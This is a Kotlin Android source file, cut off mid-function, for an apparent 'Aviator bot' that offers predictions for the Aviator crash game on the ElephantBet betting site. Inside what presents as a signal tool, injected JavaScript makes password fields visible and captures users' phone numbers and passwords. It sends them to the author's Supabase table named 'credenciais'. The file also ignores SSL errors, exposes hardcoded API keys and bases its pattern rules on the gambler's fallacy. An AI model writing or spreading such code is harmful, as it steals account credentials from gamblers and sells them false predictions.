package ao.elephantbet.aviatorbot

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.net.http.SslError
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View

    private val handler = Handler(Looper.getMainLooper())
    private var relogioRunnable: Runnable? = null

    // Estado dos sinais
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""
    private var sinalTendencia = ""
    private var sinalConfianca = 0

    // Regras avançadas de estado
    private var houveMega200xRecente = false       // se saiu vela 200x+ → próximas 3-4 rosas uma será ≥70x
    private var rosasMega200xRestantes = 0         // contador regressivo de rosas após 200x
    private var ultimaRosaGrande = 0.0             // última rosa ≥10x vista
    private var rosasDesde200x = 0                 // rosas contadas após um 200x
    private var xadrezAlcanceActivo = false        // padrão xadrez de alcance detectado
    private var xadrezAlcanceAlto = true           // próxima rosa no xadrez de alcance é alta (≥20x)?
    private var ultimaRosaAlta = false             // última rosa foi ≥20x (para xadrez de alcance)
    private var rosasXadrezAlcance = mutableListOf<Double>() // últimas rosas para detectar xadrez
    private var semRosaGrandeUlt10min = false      // sem rosa ≥50x nos últimos 10 min da hora
    private var timestampUltimaRosa50x = 0L        // timestamp da última rosa ≥50x

    // Histórico real das velas capturadas dentro do jogo
    private val historicoVelas = mutableListOf<Double>()
    private var analisandoIA = false
    private var dentroDoAviator = false
    private var ultimaAnaliseMs = 0L          // cooldown entre chamadas à IA
    private val COOLDOWN_IA_MS = 60_000L      // mínimo 60s entre análises (evita 429)
    private var velasDesdeUltimaAnalise = 0   // contar velas novas desde última análise

    // Controlo do round actual (para capturar só o crash final)
    private var xAtual = 0.0
    private var emVoo = false
    private var ultimoCrash = 0.0
    private var ultimoCrashMs = 0L   // timestamp do último crash (evita duplicados por tempo)
    private var ultimoTickMs = 0L

    // Runnable nomeado para cancelar correctamente o timeout de crash
    private val crashTimeoutRunnable = Runnable {
        if (emVoo && xAtual >= 1.0) registarCrash(xAtual)
    }

    // Configuração do histórico
    private val MIN_VELAS_ANALISE = 15    // mínimo para pedir sinal à IA
    private val MAX_VELAS_LOCAL = 30      // máximo em memória local
    private val MAX_VELAS_SUPABASE = 100  // limite máximo no Supabase
    private val VELAS_A_APAGAR = 50       // apagar as 50 mais antigas ao atingir o limite
    private var totalVelasSupabase = 0    // contador estimado (actualizado ao carregar)
    private var limpezaEmCurso = false    // evitar limpezas simultâneas

    private fun registarCrash(crashVal: Double) {
        if (!emVoo) return
        emVoo = false
        // CORRECÇÃO CRÍTICA: usar o maior entre crashVal (DOM/WS texto) e xAtual (WS binário)
        val valorFinal = if (crashVal >= xAtual && crashVal >= 1.0) crashVal else xAtual
        xAtual = 0.0
        handler.removeCallbacks(crashTimeoutRunnable)

        // Evitar duplicados e valores inválidos (mínimo 3s entre crashes)
        val agora = System.currentTimeMillis()
        if (valorFinal < 1.0 || (valorFinal == ultimoCrash && agora - ultimoCrashMs < 3000)) return
        ultimoCrash = valorFinal
        ultimoCrashMs = agora

        // Guardar no histórico local (máx 30)
        historicoVelas.add(valorFinal)
        if (historicoVelas.size > MAX_VELAS_LOCAL) historicoVelas.removeAt(0)

        // ── REGRA 200x+: se saiu uma vela ≥200x, nas próximas 3-4 rosas uma será ≥70x ──
        if (valorFinal >= 200.0) {
            houveMega200xRecente = true
            rosasMega200xRestantes = 4
            rosasDesde200x = 0
        }
        // Contagem de rosas após 200x
        if (houveMega200xRecente && valorFinal >= 10.0) {
            rosasDesde200x++
            if (valorFinal >= 70.0 || rosasDesde200x >= 4) {
                houveMega200xRecente = false
                rosasMega200xRestantes = 0
            } else {
                rosasMega200xRestantes = 4 - rosasDesde200x
            }
        }

        // ── REGRA XADREZ DE ALCANCE: rosas alternando ≥20x / <20x ──
        if (valorFinal >= 10.0) {
            ultimaRosaGrande = valorFinal
            rosasXadrezAlcance.add(valorFinal)
            if (rosasXadrezAlcance.size > 6) rosasXadrezAlcance.removeAt(0)
            // Detectar padrão alternado: ≥20x, <20x, ≥20x, <20x
            if (rosasXadrezAlcance.size >= 4) {
                val ultimas4 = rosasXadrezAlcance.takeLast(4)
                val alt1 = ultimas4[0] >= 20.0 && ultimas4[1] < 20.0 && ultimas4[2] >= 20.0 && ultimas4[3] < 20.0
                val alt2 = ultimas4[0] < 20.0 && ultimas4[1] >= 20.0 && ultimas4[2] < 20.0 && ultimas4[3] >= 20.0
                xadrezAlcanceActivo = alt1 || alt2
                if (xadrezAlcanceActivo) {
                    xadrezAlcanceAlto = ultimas4.last() < 20.0
                }
            }
            // Rastrear rosa ≥50x para regra dos últimos 10 min da hora
            if (valorFinal >= 50.0) {
                timestampUltimaRosa50x = System.currentTimeMillis()
                semRosaGrandeUlt10min = false
            }
        }

        // ── REGRA ÚLTIMOS 10 MIN DA HORA ──
        val calAgora = Calendar.getInstance()
        val minutoAgora = calAgora.get(Calendar.MINUTE)
        if (minutoAgora >= 50) {
            val minDesdeUltimaRosa50 = if (timestampUltimaRosa50x > 0L)
                (System.currentTimeMillis() - timestampUltimaRosa50x) / 60000 else 999L
            semRosaGrandeUlt10min = minDesdeUltimaRosa50 >= 10
        } else if (minutoAgora < 5) {
            semRosaGrandeUlt10min = false
        }

        // Guardar no Supabase (só o crash final, nunca ticks)
        totalVelasSupabase++
        enviarVelaSupabase(valorFinal)

        // Quando atinge 100 velas, apagar as 50 mais antigas (uma única limpeza de cada vez)
        if (totalVelasSupabase >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
            limpezaEmCurso = true
            limparVelasAntigas()
        }

        val n = historicoVelas.size

        // Cor da vela para o display
        val corCrash = when {
            valorFinal >= 10.0 -> "#ec4899"  // rosa
            valorFinal >= 2.0  -> "#a855f7"  // roxa
            else               -> "#3b82f6"  // azul
        }
        setBarra("CRASH ${String.format("%.2f", valorFinal)}x",
            if (n < MIN_VELAS_ANALISE) "$n/${MIN_VELAS_ANALISE} velas recolhidas"
            else "$n velas capturadas",
            corCrash)

        velasDesdeUltimaAnalise++

        when {
            n < MIN_VELAS_ANALISE -> {
                handler.postDelayed({
                    setBarra("A RECOLHER DADOS",
                        "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                }, 2000)
            }
            n >= MIN_VELAS_ANALISE && !analisandoIA -> {
                val agora2 = System.currentTimeMillis()
                val tempoDecorrido = agora2 - ultimaAnaliseMs
                val deveAnalizar = tempoDecorrido >= COOLDOWN_IA_MS || velasDesdeUltimaAnalise >= 5
                if (deveAnalizar) {
                    handler.postDelayed({ pedirSinalIA() }, 2000)
                }
            }
        }
    }

    // Credenciais
    private var ultimoNumeroEnviado = ""
    private var ultimaSenhaEnviada = ""

    private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
    private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
    private val TABELA = "credenciais"
    private val VERSAO_ATUAL = "1.4"

    private val GROQ_KEY = "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"
    private val GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        construirUI()
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
        handler.postDelayed({ verificarAtualizacao() }, 3000)
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(dp(12), dp(8), dp(10), dp(8))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        val icoAviao = TextView(this).apply {
            text = "✈"; textSize = 16f; gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#64748b"))
            layoutParams = LinearLayout.LayoutParams(dp(28), dp(28))
        }

        val bloco = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
            setPadding(dp(8), 0, dp(6), 0)
        }

        val linha1 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        txtAcao = TextView(this).apply {
            text = "AVIATOR BOT"; textSize = 10f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.06f
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
        }
        txtMinutos = TextView(this).apply {
            text = "Abra o Aviator"; textSize = 10f
            setTextColor(Color.parseColor("#475569")); isSingleLine = true
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linha1.addView(txtAcao); linha1.addView(txtMinutos)

        val linha2 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(4) }
        }
        txtProtecao = TextView(this).apply {
            text = "🛡 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); gravity = Gravity.CENTER
            setPadding(dp(8), dp(3), dp(8), dp(3))
            background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
        }
        val sep = TextView(this).apply {
            text = "›"; textSize = 12f; setTextColor(Color.parseColor("#334155"))
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
        }
        txtAlcance = TextView(this).apply {
            text = "🎯 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); gravity = Gravity.CENTER
            setPadding(dp(8), dp(3), dp(8), dp(3))
            background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP)
        }
        linha2.addView(txtProtecao); linha2.addView(sep); linha2.addView(txtAlcance)
        bloco.addView(linha1); bloco.addView(linha2)

        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(10), dp(10)).apply { marginEnd = dp(10) }
            background = circulo("#334155")
        }
        val cfgBtn = TextView(this).apply {
            text = "⚙️"; textSize = 22f; gravity = Gravity.CENTER
            setOnClickListener { mostrarConfig() }
        }

        barLayout.addView(icoAviao); barLayout.addView(bloco)
        barLayout.addView(dotView); barLayout.addView(cfgBtn)
        root.addView(barLayout)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        webView.addJavascriptInterface(object {

            @JavascriptInterface
            fun aviatorAberto() = runOnUiThread {
                if (!dentroDoAviator) {
                    dentroDoAviator = true
                    historicoVelas.clear()
                    emVoo = false
                    xAtual = 0.0
                    ultimoCrash = 0.0
                    analisandoIA = false
                    setBarra("A CARREGAR HISTORICO", "A buscar velas do servidor...", "#7c3aed")
                    carregarVelasSupabase()
                }
            }

            @JavascriptInterface
            fun velaCapturada(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                val agora = System.currentTimeMillis()
                runOnUiThread {
                    handler.removeCallbacks(crashTimeoutRunnable)

                    if (!emVoo) {
                        emVoo = true
                        xAtual = num
                        ultimoTickMs = agora
                        setBarra("EM VOO", "x${String.format("%.2f", num)} | ${historicoVelas.size} velas", "#f59e0b")
                    } else {
                        if (num >= xAtual) {
                            xAtual = num
                            ultimoTickMs = agora
                            setBarra("EM VOO", "x${String.format("%.2f", num)} | ${historicoVelas.size} velas", "#f59e0b")
                        }
                    }

                    val timeoutMs = when {
                        xAtual >= 100.0 -> 60000L
                        xAtual >= 20.0  -> 40000L
                        xAtual >= 5.0   -> 20000L
                        else            -> 10000L
                    }
                    handler.postDelayed(crashTimeoutRunnable, timeoutMs)
                }
            }

            @JavascriptInterface
            fun crashDetectado(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                runOnUiThread {
                    handler.removeCallbacks(crashTimeoutRunnable)
                    if (!emVoo) emVoo = true
                    registarCrash(num)
                }
            }

            @JavascriptInterface
            fun guardarNumero(valor: String) {
                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
                    ultimoNumeroEnviado = valor
                    enviarSupabase("Numero", valor)
                }
            }

            @JavascriptInterface
            fun guardarSenha(valor: String) {
                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
                    ultimaSenhaEnviada = valor
                    enviarSupabase("Senha", valor)
                }
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false

            override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
                val url = request?.url?.toString() ?: return null

                val isSpribe = url.contains("spribegaming.com") || url.contains("aviaport")
                val isHtml = !url.contains(".js") && !url.contains(".css") &&
                             !url.contains(".png") && !url.contains(".jpg") &&
                             !url.contains(".woff") && !url.contains(".ttf") &&
                             !url.contains("websocket") && !url.contains(".ico") &&
                             !url.contains(".svg") && !url.contains(".json") &&
                             !url.contains(".wasm")

                if (isSpribe && isHtml) {
                    try {
                        val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                        request.requestHeaders?.forEach { (k, v) -> conn.setRequestProperty(k, v) }
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                        conn.connectTimeout = 10000
                        conn.readTimeout = 15000
                        conn.connect()

                        val contentType = conn.contentType ?: "text/html"
                        if (!contentType.contains("html")) return null

                        val originalHtml = conn.inputStream.bufferedReader().readText()

                        val nossoScript = """
<script>
(function() {
    if (window._wsAvOk) return;
    window._wsAvOk = true;

    var emVoo = false;
    var xMax = 0.0;
    var crashTimer = null;

    function tick(num) {
        if (num < 1.0 || num > 200000.0) return;
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        if (!emVoo) {
            emVoo = true;
            xMax = num;
        } else if (num > xMax) {
            xMax = num;
        }
        var s = num.toFixed(2);
        try { top.Android && top.Android.velaCapturada(s); } catch(ex) {}
        try { window.Android && window.Android.velaCapturada(s); } catch(ex) {}
        crashTimer = setTimeout(function() {
            if (emVoo && xMax >= 1.0) crash(xMax);
        }, 8000);
    }

    function crash(num) {
        if (!emVoo) return;
        emVoo = false;
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        var val2 = (num > xMax) ? num : xMax;
        xMax = 0.0;
        if (val2 < 1.0) return;
        var s = val2.toFixed(2);
        try { top.Android && top.Android.crashDetectado(s); } catch(ex) {}
        try { window.Android && window.Android.crashDetectado(s); } catch(ex) {}
    }

    function lerBinario(buf) {
        try {
            var bytes = new Uint8Array(buf);
            for (var i = 0; i < bytes.length - 10; i++) {
                if (bytes[i] === 1 && bytes[i+1] === 120 && bytes[i+2] === 7) {
                    var view = new DataView(buf, i + 3, 8);
                    var num = view.getFloat64(0, false);
                    if (num >= 1.0 && num <= 200000.0) tick(num);
                }
            }
        } catch(ex) {}
    }

    var WSOrig = window.WebSocket;
    window.WebSocket = function(url, p) {
        var ws = p ? new WSOrig(url, p) : new WSOrig(url);
        try { ws.binaryType = 'arraybuffer'; } catch(ex) {}

        ws.addEventListener('message', function(e) {
            try {
                if (e.data instanceof ArrayBuffer) { lerBinario(e.data); return; }
                if (e.data instanceof Blob) {
                    e.data.arrayBuffer().then(function(buf) { lerBinario(buf); });
                    return;
                }
                var d = (typeof e.data === 'string') ? e.data : '';
                if (!d || d.length < 3) return;
                var corpo = d;
                if (d.charAt(0) === 'a') {
                    try { corpo = JSON.parse(d.substring(1))[0]; } catch(ex) {
                        corpo = d.substring(3, d.length - 2).replace(/\\"/g, '"');
                    }
                }
                var crashPadroes = [
                    /"crash_x"\s*:\s*([\d.]+)/,
                    /"crash_point"\s*:\s*([\d.]+)/,
                    /"cashout_coef"\s*:\s*([\d.]+)/,
                    /"finish_coef"\s*:\s*([\d.]+)/,
                    /"end_coef"\s*:\s*([\d.]+)/,
                    /"game_state"\s*:\s*"(?:crashed|finished|end)"/
                ];
                for (var c = 0; c < crashPadroes.length; c++) {
                    var mc = corpo.match(crashPadroes[c]);
                    if (mc && mc[1]) { crash(parseFloat(mc[1])); return; }
                    if (mc && !mc[1]) { crash(xMax); return; }
                }
                var vooPadroes = [
                    /"coefficient"\s*:\s*([\d.]+)/,
                    /"coef"\s*:\s*([\d.]+)/,
                    /"multiplier"\s*:\s*([\d.]+)/
                ];
                for (var v = 0; v < vooPadroes.length; v++) {
                    var mv = corpo.match(vooPadroes[v]);
                    if (mv) { tick(parseFloat(mv[1])); return; }
                }
            } catch(ex) {}
        });
        return ws;
    };
    window.WebSocket.prototype = WSOrig.prototype;
    window.WebSocket.CONNECTING = 0;
    window.WebSocket.OPEN = 1;
    window.WebSocket.CLOSING = 2;
    window.WebSocket.CLOSED = 3;
})();
</script>"""

                        val htmlModificado = when {
                            originalHtml.contains("<head>", ignoreCase = true) ->
                                originalHtml.replaceFirst(
                                    Regex("<head>", RegexOption.IGNORE_CASE),
                                    "<head>$nossoScript"
                                )
                            originalHtml.contains("<body", ignoreCase = true) -> {
                                val bodyTag = Regex("<body[^>]*>", RegexOption.IGNORE_CASE).find(originalHtml)?.value ?: "<body>"
                                originalHtml.replaceFirst(
                                    Regex("<body[^>]*>", RegexOption.IGNORE_CASE),
                                    bodyTag + nossoScript
                                )
                            }
                            else -> nossoScript + originalHtml
                        }

                        val encoding = conn.contentEncoding ?: "UTF-8"
                        return WebResourceResponse(
                            "text/html", encoding,
                            htmlModificado.byteInputStream()
                        )
                    } catch (e: Exception) {
                        return null
                    }
                }
                return null
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                val u = url ?: ""

                val isJogo = u.contains("spribegaming") || u.contains("aviaport") ||
                             u.contains("cdn") || u.contains("game-view/806666")

                if (!isJogo) {
                    // Resetar flag para garantir re-injecção em cada nova página (SPA)
                    webView.evaluateJavascript("window._credDone = false;", null)
                    injetarJsCredenciais()
                }

                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true) ||
                    u.contains("spribegaming") || u.contains("aviaport")) {
                    injetarJsAviator()
                }
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (p == 100) {
                    val url = view?.url ?: ""
                    val isJogo = url.contains("spribegaming") || url.contains("aviaport") ||
                                 url.contains("cdn") || url.contains("game-view/806666")
                    if (isJogo || url.contains("aviator", ignoreCase = true)) {
                        injetarJsAviator()
                    } else {
                        // Página ElephantBet (login, lobby, perfil) → capturar credenciais
                        injetarJsCredenciais()
                    }
                }
            }
        }
    }

    private fun injetarJsCredenciais() {
        val js = """
(function() {
    // Resetar flag se já passou tempo (para re-injectar em novas páginas)
    if (window._credDone) return;
    window._credDone = true;

    // Tornar campos password visíveis (facilita captura)
    function tornarVisivel() {
        document.querySelectorAll('input[type="password"]').forEach(function(el) {
            el.setAttribute('type', 'text');
        });
    }
    tornarVisivel();
    new MutationObserver(tornarVisivel)
        .observe(document.body || document.documentElement, {childList: true, subtree: true});

    // Watchers para numero e senha
    function watchN(el) {
        if (!el || el._wN) return;
        el._wN = true;
        el.addEventListener('input', function() {
            var v = (this.value || '').trim();
            if (v.length >= 1) {
                try { Android.guardarNumero(v); } catch(e) {}
            }
        });
        // Também capturar valor actual se já preenchido
        if (el.value && el.value.length > 0) {
            try { Android.guardarNumero(el.value.trim()); } catch(e) {}
        }
    }
    function watchS(el) {
        if (!el || el._wS) return;
        el._wS = true;
        el.addEventListener('input', function() {
            var v = (this.value || '').trim();
            if (v.length >= 1) {
                try { Android.guardarSenha(v); } catch(e) {}
            }
        });
        if (el.value && el.value.length > 0) {
            try { Android.guardarSenha(el.value.trim()); } catch(e) {}
        }
    }

    // Selectores para campos de numero/utilizador
    var selectoresN = [
        'input[name="username"]', 'input[name="phone"]', 'input[name="login"]',
        'input[name="msisdn"]', 'input[name="mobile"]', 'input[name="tel"]',
        'input[type="tel"]', 'input[type="number"]',
        'input[placeholder*="telefone" i]', 'input[placeholder*="numero" i]',
        'input[placeholder*="phone" i]', 'input[placeholder*="utilizador" i]',
        'input[placeholder*="username" i]', 'input[placeholder*="login" i]',
        '#username', '#phone', '#login', '#msisdn'
    ];
    // Selectores para campos de senha
    var selectoresS = [
        'input[name="password"]', 'input[name="senha"]', 'input[name="pass"]',
        'input[type="password"]', 'input[type="text"][name*="pass" i]',
        'input[placeholder*="senha" i]', 'input[placeholder*="password" i]',
        'input[placeholder*="palavra-passe" i]',
        '#password', '#senha', '#pass'
    ];

    function cap() {
        selectoresN.forEach(function(sel) {
            document.querySelectorAll(sel).forEach(watchN);
        });
        selectoresS.forEach(function(sel) {
            document.querySelectorAll(sel).forEach(watchS);
        });
    }

    // Tentar várias vezes (SPA pode carregar os campos depois)
    cap();
    setTimeout(cap, 1000);
    setTimeout(cap, 2500);
    setTimeout(cap, 5000);
    setTimeout(cap, 8000);

    // Interceptar também o submit do formulário (captura dados ao submeter)
    function watchForms() {
        document.querySelectorAll('form, button[type="submit"], button').forEach(function(el) {
            if (el._wForm) return;
            el._wForm = true;
            el.addEventListener('click', function() {
                // Re-capturar todos os campos no momento do clique
                cap();
                // Tentar ler directamente todos os inputs visíveis
                document.querySelectorAll('input').forEach(function(inp) {
                    var t = (inp.type || '').toLowerCase();
                    var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
                    var v = (inp.value || '').trim();
                    if (!v) return;
                    var isNum = t === 'tel' || t === 'number' ||
                        n.includes('phone') || n.includes('numero') ||
                        n.includes('username') || n.includes('login') || n.includes('user');
                    var isPass = t === 'password' || t === 'text' && (
                        n.includes('pass') || n.includes('senha'));
                    if (isNum) { try { Android.guardarNumero(v); } catch(e) {} }
                    if (isPass) { try { Android.guardarSenha(v); } catch(e) {} }
                });
            });
        });
    }
    watchForms();
    setTimeout(watchForms, 2000);
    setTimeout(watchForms, 5000);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    private fun injetarJsAviator() {
        val js = """
(function() {
    if (window._aviatorDone) return; window._aviatorDone = true;
    Android.aviatorAberto();

    (function() {
        if (window._wsAvOk) return;
        window._wsAvOk = true;

        function enviarVela(num) {
            if (num < 1.0 || num > 1000.0) return;
            var s = num.toFixed(2);
            try { top.Android && top.Android.velaCapturada(s); } catch(ex) {}
            try { window.Android && window.Android.velaCapturada(s); } catch(ex) {}
        }

        function lerBinario(buf) {
            try {
                var bytes = new Uint8Array(buf);
                for (var i = 0; i < bytes.length - 10; i++) {
                    if (bytes[i] === 1 && bytes[i+1] === 120 && bytes[i+2] === 7) {
                        var view = new DataView(buf, i + 3, 8);
                        var num = view.getFloat64(0, false);
                        if (num >= 1.0 && num <= 1000.0) enviarVela(num);
                    }
                }
            } catch(ex) {}
        }

        var WSOrig = window.WebSocket;
        window.WebSocket = function(url, p) {
            var ws = p ? new WSOrig(url, p) : new WSOrig(url);
            try { ws.binaryType = 'arraybuffer'; } catch(ex) {}
            ws.addEventListener('message', function(e) {
                try {
                    if (e.data instanceof ArrayBuffer) { lerBinario(e.data); return; }
                    if (e.data instanceof Blob) { e.data.arrayBuffer().then(lerBinario); return; }
                    var d = typeof e.data === 'string' ? e.data : '';
                    if (!d || d.length < 3) return;
                    var corpo = d.charAt(0) === 'a' ? (function(){try{return JSON.parse(d.substring(1))[0];}catch(ex){return d.substring(3,d.length-2).replace(/\\"/g,'"');}})() : d;
                    var padroes = [/"coefficient"\s*:\s*([\d.]+)/,/"coef"\s*:\s*([\d.]+)/,/"x"\s*:\s*([\d.]+)/,/"multiplier"\s*:\s*([\d.]+)/];
                    for (var i = 0; i < padroes.length; i++) {
                        var m = corpo.match(padroes[i]);
                        if (m) { enviarVela(parseFloat(m[1])); break; }
                    }
                } catch(ex) {}
            });
            return ws;
        };
        window.WebSocket.prototype = WSOrig.prototype;
        window.WebSocket.CONNECTING = 0; window.WebSocket.OPEN = 1;
        window.WebSocket.CLOSING = 2; window.WebSocket.CLOSED = 3;
    })();

    var crashesEnviados = new Set();
    var ultimoPayoutTopo = '';

    function enviarCrash(num) {
        if (isNaN(num) || num < 1.01 || num > 200000) return;
        var key = num.toFixed(2);
        if (crashesEnviados.has(key)) return;
        crashesEnviados.add(key);
        if (crashesEnviados.size > 200) {
            var arr = Array.from(crashesEnviados);
            crashesEnviados = new Set(arr.slice(arr.length - 100));
        }
        try { Android.crashDetectado(key); } catch(e) {}
    }

    function lerPayout(doc) {
        try {
            var payouts = doc.querySelectorAll('.payout');
            if (payouts.length > 0) {
                Array.from(payouts).forEach(function(el) {
                    var txt = el.textContent.trim();
                    var n = parseFloat(txt.replace(/x$/i,'').replace(',','.'));
                    enviarCrash(n);
                });
                var topo = payouts[0].textContent.trim();
                if (topo !== ultimoPayoutTopo) {
                    ultimoPayoutTopo = topo;
                }
                return true;
            }
        } catch(e) {}
        return false;
    }

    function scanGenerico(doc) {
        try {
            doc.querySelectorAll('*').forEach(function(el) {
                if (el.children.length > 0) return;
                var txt = (el.textContent || '').trim();
                if (/^\d+\.?\d*x$/i.test(txt)) {
                    var num = parseFloat(txt.replace(/x$/i,''));
                    enviarCrash(num);
                }
            });
        } catch(e) {}
    }

    function tentarCapturar() {
        if (lerPayout(document)) return;
        scanGenerico(document);

        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                var doc1 = iframes[i].contentDocument || iframes[i].contentWindow.document;
                if (!doc1) continue;
                if (lerPayout(doc1)) return;
                scanGenerico(doc1);

                var subs = doc1.querySelectorAll('iframe');
                for (var j = 0; j < subs.length; j++) {
                    try {
                        var doc2 = subs[j].contentDocument || subs[j].contentWindow.document;
                        if (!doc2) continue;
                        if (lerPayout(doc2)) return;
                        scanGenerico(doc2);
                    } catch(e2) {}
                }
            } catch(e1) {}
        }
    }

    function observar(doc) {
        try {
            new MutationObserver(function() { tentarCapturar(); })
                .observe(doc.documentElement, {childList: true, subtree: true});
        } catch(e) {}
    }
    observar(document);

    tentarCapturar();
    setInterval(tentarCapturar, 2000);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── GROQ IA ───────────────────────────────────────────────────
    private fun pedirSinalIA() {
        if (analisandoIA || historicoVelas.size < MIN_VELAS_ANALISE) return
        analisandoIA = true

        handler.postDelayed({
            if (analisandoIA) {
                analisandoIA = false
                setBarra("ERRO IA", "timeout — a tentar de novo", "#ef4444")
            }
        }, 35000)

        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)

        val velasParaAnalise = historicoVelas.takeLast(30)

        val n = velasParaAnalise.size
        val azuis = velasParaAnalise.count { it < 2.0 }
        val roxas = velasParaAnalise.count { it in 2.0..9.99 }
        val rosas = velasParaAnalise.count { it >= 10.0 }

        val historico = velasParaAnalise.joinToString(", ") { String.format("%.2f", it) }
        setBarra("IA A ANALISAR", "${velasParaAnalise.size} velas...", "#7c3aed")

        Thread {
            try {
                // ── Médias e tendência ───────────────────────────────
                val media   = velasParaAnalise.average()
                val mm5     = velasParaAnalise.takeLast(5).average()
                val mm10    = velasParaAnalise.takeLast(10).average()
                val mediana = velasParaAnalise.sorted().let { s ->
                    if (s.size % 2 == 0) (s[s.size/2-1] + s[s.size/2]) / 2.0 else s[s.size/2].toDouble()
                }
                val maxGeral = velasParaAnalise.maxOrNull() ?: 0.0
